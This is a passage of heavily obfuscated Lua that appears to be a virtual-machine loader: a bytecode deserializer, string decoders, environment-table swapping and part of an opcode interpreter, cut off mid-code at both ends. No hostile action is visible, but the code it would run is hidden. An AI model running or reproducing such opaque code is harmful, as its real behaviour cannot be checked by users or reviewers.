if not((by~=ct))then break else return da end end end else if de~=5 then return db else break end end end de=de+1 end end,function(by,bz,cc,ce)local cs=0 while true do if cs<=2 then if cs<=0 then if(cx>bw)then local bw=cw while true do bw=(bw+cu)if not(bw~=ct)then break else return by end end end else if cs<2 then cx=cx+cu else cy=((cy-bk)%bs)end end else if cs<=3 then if(not((cy%bi)~=bj)or((cy%bi))>bj)then local bi=cw while true do bi=(bi+cu)if((bi==ct or bi>ct))then if(bi<bh)then return cc else break end else cy=(cy*bg)%be end end else local be=cw while true do be=((be+cu))if(be<ct)then return by(bz(ce and bz,(by and bz),(cc and by),by),((ce(bz,ce,bz,((cc and ce)))and cc(cc,ce,cc,cc))),(cc(ce,by and ce,by,ce)and bz(by,by and by,cc,bz)),cc(cc,ce,((bz and ce)),cc))else break end end end else if 4<cs then break else return by(cc(cc,bz,(cc and by),ce),ce(cc,cc,ce,by),by(ce,ce,bz,by),bz(by,(by and by),cc,ce))end end end cs=cs+1 end end,function(be,bg,bi,bj)local bk=0 while true do if bk<=2 then if bk<=0 then if(cx>bf)then local bf=cw while true do bf=(bf+cu)if bf<ct then return bj else break end end end else if 1==bk then cx=cx+cu else cy=((cy+y)%x)end end else if bk<=3 then if(((cy%v)>w or(cy%v)==w))then local v=cw while true do v=((v+cu))if((v<cu or not(v~=cu)))then cy=(((cy-ca)%s))else if not(not(v==bh))then break else return bj end end end else local s=cw while true do s=((s+cu))if not(not(s==ct))then break else return bi(be(bi,((be and bi)),bg,bj),((bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj))),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if 4==bk then return be(bi(bg and bj,bg,bg and be,((bj and bi))),bj(be,bi,bj,bi),bj(bj and bi,(bi and bi),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if cx>q then local q=cw while true do q=q+cu if(q<ct)then return x else break end end end else if 2>y then cx=cx+cu else cy=(((cy*p))%d)end end else if y<=3 then if(((cy%c))>b)then local b=cw while true do b=(b+cu)if(b<ct)then return s(w(x,s,s,((v and w))),s(s,w,v,((v and s)))and x(v,x,x,v),v(s,x,s,((w and s))),(w(s,w,s,w)and s(v,w,s,((s and x)))))else break end end else local b=cw while true do b=b+cu if not(not(b==ct))then break else return v end end end else if 5>y then return x else break end end end y=y+1 end end)else if a<32 then return cy;else break end end end end end end a=a+1 end end)());end else if bd<=29 then cl="\46"else if 30==bd then cm=function()local a,b,c=0 while true do if a<=1 then if a~=1 then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=(br+2);else if 3==a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if bd>32 then cp=cf else co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if 1==a then c=157 else d=0 end end else if a<=3 then p={}else if a>4 then break else while(d<8)do d=(d+1);while(d<707 and c%1622<811)do c=((c*35))local q=d+c if((c%16522)<8261)then c=((c*19))while((((d<828))and c%658<329))do c=(((c+60)))local q=(d+c)if(((c%18428))==9214 or((c%18428))<9214)then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not((q~=0))then return g;end;b=j(bn,br,(br+q-1));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if 0<v then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif(not(c%4==0))then c=(c-67)local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(v==1)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=((c*88))d=d+1 local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 1>v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end elseif not(not(c%4~=0))then c=(c-48)while(((d<859)and c%1392<696))do c=((c*39))local q=(d+c)if(c%58)<29 then c=((c+5))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(c%4==0)then c=((c*56))local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if(1~=v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=d+1;end else c=((c-51))d=((d+1))while((d<663)and((((c%936))<468)))do c=(((c*12)))local q=(d+c)if((((c%18532))>9266 or((c%18532))==9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not((c%4==0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 1~=v then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=(c*35)d=((d+1))local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p~=2 then while true do if not(q~=0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=(d+1);end end;d=(d+1);end c=((c-494))if((d>43))then break;end;end;end end end a=a+1 end end end else if bd<=34 then cq=function(...)local a=0 while true do if 0==a then return{...},n("\35",...)else break end a=a+1 end end else if bd==35 then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a==0 then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if a==3 then v=490 else w=0 end end end else if a<=6 then if 5==a then x={}else while w<3 do w=(w+1);while((w<481 and v%320<160))do v=(v*62)local d=w+v if(v%916)>458 then v=(((v-88)))while((w<318)and v%702<351)do v=(((v*8)))local d=((w+v))if((v%14064)>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=(v*37)local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=(w+1)local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(j~=2))then s[d]=nil;elseif(not(not(j==3)))then s[d]=(not((cg()==0)));elseif((j==1))then s[d]=ck();elseif(not(not(j==0)))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(not(((v%4))~=0))then v=(((v*65)))while w<615 and v%618<309 do v=(v-33)local d=(w+v)if(((v%15582)>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=((w+1))local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end else v=(v+7)w=(w+1)while((w<127)and(v%1548<774))do v=(v-37)local d=(w+v)if((v%19188)>9594)then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=((w+1))local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=(w+1);end v=(v*482)if w>56 then break;end;end;end else if a<=7 then for d=1,cf()do c[d-1]=cr();end;else if 9~=a then v=923 else w=0 end end end end else if a<=14 then if a<=11 then if a~=11 then x={}else while((w<3))do w=(w+1);while(w<381 and v%240<120)do v=(v-63)local c=(w+v)if((((v%13880))>6940))then v=(v*2)while w<831 and v%150<75 do v=((v*66))local c=((w+v))if(((v%14994))==7497 or(((v%14994))<7497))then v=((v-75))local c=80431 if not x[c]then x[c]=1;end elseif not(not((v%4)~=0))then v=(((v*87)))local c=99271 if not x[c]then x[c]=1;end else v=(v*44)w=w+1 local c=26919 if not x[c]then x[c]=1;end end;w=(w+1);end elseif not(v%4==0)then v=(((v+62)))while w<298 and v%1486<743 do v=(((v-49)))local c=(w+v)if(((v%13402))>6701 or((v%13402))==6701)then v=((v+97))local c=94447 if not x[c]then x[c]=1;end elseif not(v%4==0)then v=(v*5)local c=46206 if not x[c]then x[c]=1;end else v=(v-1)w=w+1 local c=62235 if not x[c]then x[c]=1;end end;w=w+1;end else v=(v*50)w=w+1 while((w<421 and v%772<386))do v=(((v*53)))local c=w+v if((v%506)>253)then v=((v+98))local c=74748 if not x[c]then x[c]=1;end elseif not(((v%4)==0))then v=((v-2))local c=32244 if not x[c]then x[c]=1;end else v=(v-82)w=(w+1)local c=21517 if not x[c]then x[c]=1;local c=1;local d=2;local j=3;local p=4;for p=1,cf()do local y=cg();local bb=cd(y,c,c);if(not((not(bb==0))))then local y,bb,be=cd(y,d,j),cd(y,4,6),m({[119]=cm(),[870]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(y,d,j);end,})if((((not(y~=0))or(y==c))))then be[312]=cf();if(not(y~=0))then be[716]=cf();end;elseif(((not(y~=d))or((y==j))))then be[312]=(cf()-(e));if(not(not(y==j)))then be[716]=cm();end;end;if((not(cd(bb,c,c)~=c)))then be[870]=s[be[870]];end;if(not(not(cd(bb,d,d)==c)))then be[312]=s[be[312]];end;if((not(cd(bb,j,j)~=c)))then be[716]=s[be[716]];end;b[p]=be;end;end;end end;w=w+1;end end;w=((w+1));end v=((v+174))if((w>74))then break;end;end;end else if a<=12 then q[481]=cg();else if a==13 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[870],b[312],b[716]if not(bp(c)~=f)then c=z(c,cl,function(j,p)local p,s=0 while true do if p<=0 then s=0 else if 2>p then while true do if(s<1)then return i(bu(h(j),cb))else break end s=s+1 end else break end end p=p+1 end end)b[870]=c end if(not(not(bp(d)==f)))then d=z(d,cl,function(c,j)local j,p=0 while true do if j<=0 then p=0 else if j>1 then break else while true do if not(0~=p)then return i(bu(h(c),cb))else break end p=(p+1)end end end j=j+1 end end)b[312]=d end if(bp(e)==f)then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if 2~=d then while true do if j>0 then break else return i(bu(h(c),cb))end j=j+1 end else break end end d=d+1 end end)b[716]=e end;end;q[cj]=nil;end;else v=166 end end end else if a<=16 then if a>15 then x={}else w=0 end else if a<=17 then while(w<9)do w=(w+1);while(((w<934)and((v%1756)<878)))do v=((v+56))local b=(w+v)if(((v%19768)>9884))then v=((v+21))while(w<903 and v%652<326)do v=((v-36))local b=(w+v)if(v%18778)>9389 then v=(v*58)local b=87718 if not x[b]then x[b]=1;end elseif not(not((v%4)~=0))then v=(v-43)local b=16259 if not x[b]then x[b]=1;end else v=((v*2))w=(w+1)local b=43496 if not x[b]then x[b]=1;return q end end;w=(w+1);end elseif not(((v%4)==0))then v=((v*90))while w<563 and v%400<200 do v=((v-46))local b=(w+v)if((v%19112)<9556)then v=(((v+47)))local b=68819 if not x[b]then x[b]=1;return q end elseif not(v%4==0)then v=((v*36))local b=48267 if not x[b]then x[b]=1;end else v=((v-51))w=(w+1)local b=62045 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b~=2 then while true do if(c==2 or c<2)then if(c<0 or c==0)then d=n(1,...)else if 2~=c then e=({...})else do for d=0,#e do if((bp(e[d])==bq))then for i,i in o,e[d]do if not(not(bp(i)==bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if c<=3 then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if i<2 then while true do if(j==1 or j<1)then if j<1 then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if not(3==j)then return false else break end end j=j+1 end else break end end i=i+1 end end else if(5>c)then for d=0,#e do if(not(bp(e[d])~=bq))then return h(e[d])end end else break end end end c=(c+1)end else break end end b=b+1 end end end end;w=((w+1));end else v=(((v+43)))w=w+1 while((w<113)and((v%1700)<850))do v=((v*6))local b=((w+v))if(((v%12876)>6438))then v=(v-74)local b=93750 if not x[b]then x[b]=1;return q end elseif(v%4~=0)then v=((v-84))local b=6246 if not x[b]then x[b]=1;return q end else v=(((v*74)))w=w+1 local b=27325 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=(w+1);end v=(v-84)if(w>48)then break;end;end;else if 19~=a then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[119];if 191>=z then if 95>=z then if 47>=z then if 23>=z then if z<=11 then if 5>=z then if 2>=z then if z<=0 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;elseif z>1 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 3>=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 4<z then local ba=y[870];p=ba+x-1;for bb=ba,p do local ba=q[bb-ba];w[bb]=ba;end;else w[y[870]]=j[y[312]];end;elseif z<=8 then if 6>=z then j[y[312]]=w[y[870]];elseif z==7 then local ba;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else w[y[870]]=w[y[312]][y[716]];end;elseif z<=9 then if(y[870]<w[y[716]])then n=n+1;else n=y[312];end;elseif 10<z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[312];bb=y[716];ba=k(w,g,bc,bb);w[y[870]]=ba;end;elseif 17>=z then if 14>=z then if z<=12 then local ba=y[870]w[ba]=w[ba](r(w,ba+1,p))elseif 13<z then local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else a(c,e);end;elseif 15>=z then w[y[870]]=w[y[312]]/y[716];elseif 16==z then local ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=20 then if z<=18 then if(w[y[870]]<=w[y[716]])then n=n+1;else n=y[312];end;elseif 20~=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 21>=z then local ba;local bb,bc;local bd;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];bd=y[870]bb,bc=i(w[bd](r(w,bd+1,y[312])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;elseif 22==z then w[y[870]]=false;else local ba=y[870];do return r(w,ba,p)end;end;elseif z<=35 then if z<=29 then if 26>=z then if z<=24 then local ba=w[y[870]]+y[716];w[y[870]]=ba;if(ba<=w[y[870]+1])then n=y[312];end;elseif z<26 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])end;elseif 27>=z then if(w[y[870]]~=w[y[716]])then n=y[312];else n=n+1;end;elseif 29~=z then local ba=y[870];do return w[ba],w[ba+1]end else local ba=y[870]w[ba](r(w,ba+1,y[312]))end;elseif z<=32 then if(z==30 or z<30)then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then w[y[870]][y[312]]=y[716];else n=n+1;end else if ba<=2 then y=f[n];else if ba>3 then n=n+1;else w[y[870]]={};end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[870]][y[312]]=w[y[716]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[870]]=h[y[312]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[870]]=w[y[312]][y[716]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then n=n+1;else w[y[870]][y[312]]=w[y[716]];end else if ba<=17 then y=f[n];else if 19~=ba then w[y[870]][y[312]]=w[y[716]];else break end end end end end ba=ba+1 end elseif 31<z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[870]]=h[y[312]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 4<ba then n=n+1;else w[y[870]]=y[312];end else if ba~=7 then y=f[n];else w[y[870]]=y[312];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[870]]=y[312];end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[870]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[312]))else break end end end end ba=ba+1 end else local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 2>ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if 4>ba then y=f[n];else w[y[870]]=h[y[312]];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 8~=ba then w[y[870]]=w[y[312]][y[716]];else n=n+1;end else if ba<10 then y=f[n];else w[y[870]]=h[y[312]];end end else if ba<=12 then if 12~=ba then n=n+1;else y=f[n];end else if 14>ba then w[y[870]]={};else n=n+1;end end end end else if ba<=21 then if ba<=17 then if ba<=15 then y=f[n];else if 16==ba then w[y[870]]={};else n=n+1;end end else if ba<=19 then if 19~=ba then y=f[n];else w[y[870]][y[312]]=w[y[716]];end else if 21~=ba then n=n+1;else y=f[n];end end end else if ba<=25 then if ba<=23 then if 22==ba then w[y[870]]=j[y[312]];else n=n+1;end else if ba~=25 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end else if ba<=27 then if 27>ba then n=n+1;else y=f[n];end else if 28<ba then break else if w[y[870]]then n=n+1;else n=y[312];end;end end end end end ba=ba+1 end end;elseif 33>=z then local ba=y[870];w[ba]=w[ba]-w[ba+2];n=y[312];elseif z~=35 then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;end;elseif 41>=z then if(38>=z)then if z<=36 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[870]]=j[y[312]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[870]]=w[y[312]][y[716]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 37<z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[870]]=h[y[312]];else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[870]]=h[y[312]];else y=f[n];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else if(w[y[870]]~=y[716])then n=(n+1);else n=y[312];end;end;elseif(z<39 or z==39)then if(w[y[870]]<=w[y[716]])then n=y[312];else n=n+1;end;elseif(z~=41)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[870]]=h[y[312]];else if ba<2 then n=n+1;else y=f[n];end end else if ba<=4 then if 3<ba then n=n+1;else w[y[870]]=h[y[312]];end else if 6>ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[870]]=w[y[312]][w[y[716]]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 12==ba then if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;else break end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[870]]=w[y[312]][y[716]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[870]]=y[312];end else if ba>6 then w[y[870]]=y[312];else y=f[n];end end end else if ba<=11 then if ba<=9 then if 9>ba then n=n+1;else y=f[n];end else if 10<ba then n=n+1;else w[y[870]]=y[312];end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[870]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[312]))end end end end ba=ba+1 end end;elseif z<=44 then if z<=42 then if(w[y[870]]<=w[y[716]])then n=y[312];else n=n+1;end;elseif z<44 then for ba=y[870],y[312],1 do w[ba]=nil;end;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870];do return w[ba](r(w,ba+1,y[312]))end;n=n+1;y=f[n];ba=y[870];do return r(w,ba,p)end;end;elseif z<=45 then local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])elseif 47~=z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;end;elseif z<=71 then if 